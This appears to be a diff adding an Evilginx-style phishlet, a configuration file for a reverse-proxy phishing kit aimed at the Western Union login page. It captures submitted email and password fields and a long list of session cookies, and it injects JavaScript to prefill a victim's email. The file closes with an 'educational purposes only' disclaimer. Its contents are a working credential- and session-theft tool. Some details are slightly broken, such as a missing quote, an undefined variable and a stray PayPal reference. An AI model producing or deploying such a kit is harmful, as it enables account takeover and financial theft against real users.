@@ -1,0 +1,48 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Email Params can be Triggered By using Below Command.
+# lures edit params ID email=test@email.com
+# Where ID is lure id number, and test@email.com is your known victim account email address for paypal. 
+
+author: '@chuks'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'westernunion.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'westernunion.com', orig_sub: 'www', domain: 'westernunion.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'westernunion.com', orig_sub: 'www', domain: 'westernunion.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.westernunion.com'
+    keys: [io_token_7c6a6574-f011-4c9a-abdd-9894a102ccef','s_NewRepeatprop','s_NewRepeateVar','sc_links','SessionInfo','lastRskxRun','A4kgk7nd_dc','BIGipServerwudispatcher.westernunion.com','v0','User_Email','SessionDomain','AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg','_evgn_4cf5','accntactivation','wu_analytics_id','AKCountry','amplitude_id_4aec879ef8bf1823486c4338537ec441westernunion.com','_gcl_au','affiliate_src_code','rCookie','A4kgk7nd','SM_Start_Cookie','_aeaid','_evga_4cf5','AKAreacode','userIdentity','bm_sz','s_dfa','AKA_A2','cookieOptIn','rskxRunCookie','QuantumMetricUserID','s_ecid','_tgrsid','WULanguageCookie_','__ssid','is_mobile','aeatstartmessage','resolution_width','s_sq','userCookieOptIn','AK_TLS_Version','AKRegioncode','resolution_height','SessionId','is_tablet','channel_stack','RT','_abck','AKCounty','AKCity','AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg','OptanonConsent','RT','AKZip','WUCountryCookie_','QuantumMetricSessionID','wu_device_id']
+
+credentials:
+  username:
+    key: 'txtEmailAddr'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'txtKey'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.westernunion.com'
+  path: '/us/en/web/user/login'
+
+js_inject:
+  - trigger_domains: ["www.westernunion.com"]
+    trigger_paths: ["/us/en/web/user/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#email");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
